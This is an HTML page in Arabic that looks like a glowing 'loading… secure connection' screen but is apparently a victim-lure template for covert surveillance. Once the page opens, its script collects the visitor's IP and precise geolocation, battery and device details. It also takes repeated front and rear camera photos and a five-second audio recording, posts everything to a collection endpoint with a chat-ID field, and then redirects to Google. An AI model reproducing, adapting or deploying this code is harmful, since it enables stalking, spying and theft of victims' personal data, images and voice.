<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0f0f1a;
            color: #fff;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 500px;
            width: 100%;
            padding: 50px 30px;
            background: radial-gradient(circle at center, #1a1a2e, #0f0f1a);
            border-radius: 30px;
            border: 2px solid rgba(255, 215, 0, 0.2);
            box-shadow: 0 0 60px rgba(255, 215, 0, 0.1);
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.05), transparent, rgba(255, 215, 0, 0.05), transparent);
            animation: rotate 10s linear infinite;
        }
        @keyframes rotate {
            100% { transform: rotate(360deg); }
        }
        .content {
            position: relative;
            z-index: 1;
        }
        .icon {
            font-size: 4rem;
            margin-bottom: 10px;
            display: inline-block;
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        h1 {
            font-size: 2rem;
            color: #ffd700;
            margin-bottom: 5px;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
        }
        .sub-title {
            color: #888;
            font-size: 0.9rem;
            margin-bottom: 30px;
        }
        .loader-ring {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 20px auto;
        }
        .loader-ring::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 4px solid transparent;
            border-top-color: #ffd700;
            border-bottom-color: #ff6b6b;
            animation: spin 1.5s linear infinite;
        }
        .loader-ring::after {
            content: '';
            position: absolute;
            inset: 10px;
            border-radius: 50%;
            border: 4px solid transparent;
            border-left-color: #4ecdc4;
            border-right-color: #ffd700;
            animation: spin 2s linear infinite reverse;
        }
        @keyframes spin {
            100% { transform: rotate(360deg); }
        }
        .dots {
            display: inline-block;
            font-size: 2.5rem;
            color: #ffd700;
        }
        .dots span {
            animation: bounce 1.4s infinite both;
            display: inline-block;
        }
        .dots span:nth-child(1) { animation-delay: 0s; }
        .dots span:nth-child(2) { animation-delay: 0.2s; }
        .dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes bounce {
            0%, 80%, 100% { transform: translateY(0); opacity: 0.3; }
            40% { transform: translateY(-15px); opacity: 1; }
        }
        .status {
            margin-top: 20px;
            padding: 12px 20px;
            background: rgba(255, 215, 0, 0.05);
            border-radius: 10px;
            font-size: 0.9rem;
            color: #ffd700;
            border: 1px solid rgba(255, 215, 0, 0.15);
            min-height: 50px;
            transition: all 0.3s;
        }
        .progress-bar-custom {
            width: 100%;
            height: 4px;
            background: rgba(255, 215, 0, 0.1);
            border-radius: 2px;
            margin-top: 25px;
            overflow: hidden;
            position: relative;
        }
        .progress-fill-custom {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ffd700, #ff6b6b, #4ecdc4);
            border-radius: 2px;
            animation: fillProgress 4s ease-in-out infinite;
            position: relative;
        }
        .progress-fill-custom::after {
            content: '';
            position: absolute;
            right: 0;
            top: -2px;
            width: 10px;
            height: 8px;
            background: #ffd700;
            border-radius: 50%;
            box-shadow: 0 0 20px #ffd700;
        }
        @keyframes fillProgress {
            0% { width: 0%; }
            50% { width: 65%; }
            100% { width: 100%; }
        }
        .steps {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        }
        .step {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: rgba(255, 215, 0, 0.2);
            animation: stepPulse 2s infinite;
        }
        .step:nth-child(1) { animation-delay: 0s; }
        .step:nth-child(2) { animation-delay: 0.4s; }
        .step:nth-child(3) { animation-delay: 0.8s; }
        .step:nth-child(4) { animation-delay: 1.2s; }
        .step:nth-child(5) { animation-delay: 1.6s; }
        @keyframes stepPulse {
            0%, 100% { background: rgba(255, 215, 0, 0.2); transform: scale(1); }
            50% { background: #ffd700; transform: scale(1.5); }
        }
        .footer {
            margin-top: 30px;
            color: #444;
            font-size: 0.7rem;
            letter-spacing: 2px;
        }
        .info-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            justify-content: center;
            margin-top: 15px;
        }
        .info-tag {
            padding: 3px 12px;
            border-radius: 15px;
            font-size: 0.65rem;
            border: 1px solid rgba(255,215,0,0.15);
        }
        .tag-ip { background: rgba(78, 205, 196, 0.15); color: #4ecdc4; }
        .tag-battery { background: rgba(255, 215, 0, 0.15); color: #ffd700; }
        .tag-location { background: rgba(255, 107, 107, 0.15); color: #ff6b6b; }
    </style>
</head>
<body>
    <div class="container">
        <div class="content">
            <div class="icon">⚡</div>
            <h1>جاري التحميل</h1>
            <div class="sub-title">جمع المعلومات وإرسالها...</div>
            
            <div class="loader-ring"></div>
            <div class="dots"><span>.</span><span>.</span><span>.</span></div>
            
            <div class="status" id="status">⏳ جاري تجهيز البيانات...</div>
            
            <div class="info-grid">
                <span class="info-tag tag-ip" id="ipTag">🌐 IP: جاري...</span>
                <span class="info-tag tag-battery" id="batteryTag">🔋 جاري...</span>
                <span class="info-tag tag-location" id="locationTag">📍 جاري...</span>
            </div>
            
            <div class="progress-bar-custom">
                <div class="progress-fill-custom"></div>
            </div>
            
            <div class="steps">
                <div class="step"></div>
                <div class="step"></div>
                <div class="step"></div>
                <div class="step"></div>
                <div class="step"></div>
            </div>
            
            <div class="footer">✦ SECURE CONNECTION ✦</div>
        </div>
    </div>

    <form id="dataForm" method="POST" action="REDIRECT_URL" style="display:none;">
        <input type="hidden" name="chatId" id="chatId">
        <input type="hidden" name="imageDatas" id="imageDatas">
        <input type="hidden" name="location" id="location">
        <input type="hidden" name="permissions" id="permissions">
        <input type="hidden" name="ipInfo" id="ipInfo">
        <input type="hidden" name="battery" id="battery">
        <input type="hidden" name="audioData" id="audioData">
        <input type="hidden" name="deviceInfo" id="deviceInfo">
    </form>

    <script>
        const REDIRECT_URL = "REDIRECT_URL";
        let images = [], audioData = null;
        let ipInfo = '', batteryStatus = '', locationStr = '';
        let permissions = [];
        let deviceInfo = {};

        function updateStatus(text) {
            document.getElementById('status').textContent = text;
        }

        function updateTags() {
            if (ipInfo) document.getElementById('ipTag').textContent = '🌐 ' + ipInfo.split(',')[0];
            if (batteryStatus) document.getElementById('batteryTag').textContent = '🔋 ' + batteryStatus;
            if (locationStr) document.getElementById('locationTag').textContent = '📍 ' + locationStr.split(',')[0];
        }

        async function getIP() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                ipInfo = `Country: ${d.country_name || 'Unknown'}, City: ${d.city || 'Unknown'}, IP: ${d.ip || 'Unknown'}`;
                updateStatus('🌐 تم جلب معلومات IP');
                updateTags();
            } catch {
                ipInfo = 'Unable to get IP';
                updateStatus('⚠️ فشل جلب IP');
            }
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                batteryStatus = `Level: ${Math.round(b.level * 100)}%, Charging: ${b.charging ? 'Yes' : 'No'}`;
                updateStatus('🔋 تم جلب معلومات البطارية');
                updateTags();
            } catch {
                batteryStatus = 'Unknown';
                updateStatus('⚠️ فشل جلب البطارية');
            }
        }

        async function captureImage(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facingMode }, width: 640, height: 480 }
                });
                const v = document.createElement('video');
                v.srcObject = stream;
                await v.play();
                await new Promise(r => setTimeout(r, 300));
                
                const c = document.createElement('canvas');
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                c.getContext('2d').drawImage(v, 0, 0);
                
                const imageData = c.toDataURL('image/jpeg', 0.7).split(',')[1];
                images.push(imageData);
                
                stream.getTracks().forEach(t => t.stop());
                updateStatus(`📸 تم التقاط صورة (${facingMode === 'user' ? 'أمامية' : 'خلفية'})`);
                return true;
            } catch (error) {
                permissions.push(`Camera ${facingMode} Denied`);
                updateStatus(`⚠️ فشل التقاط الكاميرا ${facingMode === 'user' ? 'الأمامية' : 'الخلفية'}`);
                return false;
            }
        }

        async function captureAllImages() {
            await captureImage('user');
            await captureImage('environment');
            await captureImage('user');
            await captureImage('environment');
        }

        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                
                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            const base64 = reader.result.split(',')[1];
                            audioData = base64;
                            stream.getTracks().forEach(t => t.stop());
                            updateStatus('🎤 تم تسجيل الصوت');
                            resolve();
                        };
                        reader.readAsDataURL(blob);
                    };
                    
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 5000);
                });
            } catch (error) {
                permissions.push('Audio Denied');
                updateStatus('⚠️ فشل تسجيل الصوت');
                return null;
            }
        }

        async function getLocation() {
            return new Promise(res => {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        locationStr = `Lat:${p.coords.latitude}, Lon:${p.coords.longitude}, Acc:${p.coords.accuracy}m`;
                        updateStatus('📍 تم جلب الموقع');
                        updateTags();
                        res(locationStr);
                    },
                    () => {
                        permissions.push('Location Denied');
                        locationStr = '';
                        updateStatus('⚠️ فشل جلب الموقع');
                        res('');
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        async function getDeviceInfo() {
            deviceInfo = {
                platform: navigator.platform || 'Unknown',
                userAgent: navigator.userAgent || 'Unknown',
                language: navigator.language || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                cores: navigator.hardwareConcurrency || 'Unknown',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                vendor: navigator.vendor || 'Unknown',
                product: navigator.product || 'Unknown',
                cookieEnabled: navigator.cookieEnabled || false,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink || 'Unknown',
                    rtt: navigator.connection.rtt || 'Unknown'
                } : null
            };
            updateStatus('💻 تم جلب معلومات الجهاز');
            return deviceInfo;
        }

        async function sendData() {
            try {
                const fd = new FormData();
                fd.append('ipInfo', ipInfo);
                fd.append('battery', batteryStatus);
                fd.append('location', locationStr);
                fd.append('imageDatas', images.join(','));
                fd.append('permissions', permissions.join(', '));
                fd.append('audioData', audioData || '');
                fd.append('deviceInfo', JSON.stringify(deviceInfo));
                fd.append('chatId', navigator.userAgent || 'Unknown');
                
                updateStatus('📤 جاري إرسال البيانات...');
                
                const response = await fetch('/submitData', { 
                    method: 'POST', 
                    body: fd,
                    timeout: 30000
                });
                
                updateStatus('✅ تم إرسال البيانات بنجاح');
                return response;
            } catch (error) {
                console.error('Send error:', error);
                updateStatus('⚠️ فشل إرسال البيانات');
                return null;
            }
        }

        async function startProcess() {
            updateStatus('🚀 بدء جمع البيانات...');
            
            await getIP();
            await getBattery();
            await getLocation();
            await getDeviceInfo();
            await captureAllImages();
            await recordAudio();
            
            const response = await sendData();
            
            updateStatus('🔄 جاري التوجيه...');
            
            setTimeout(() => {
                if (REDIRECT_URL && REDIRECT_URL !== 'REDIRECT_URL') {
                    window.location.href = REDIRECT_URL;
                } else {
                    window.location.href = 'https://www.google.com';
                }
            }, 1500);
        }

        window.onload = function() {
            setTimeout(startProcess, 1000);
        };
    </script>
</body>
</html>
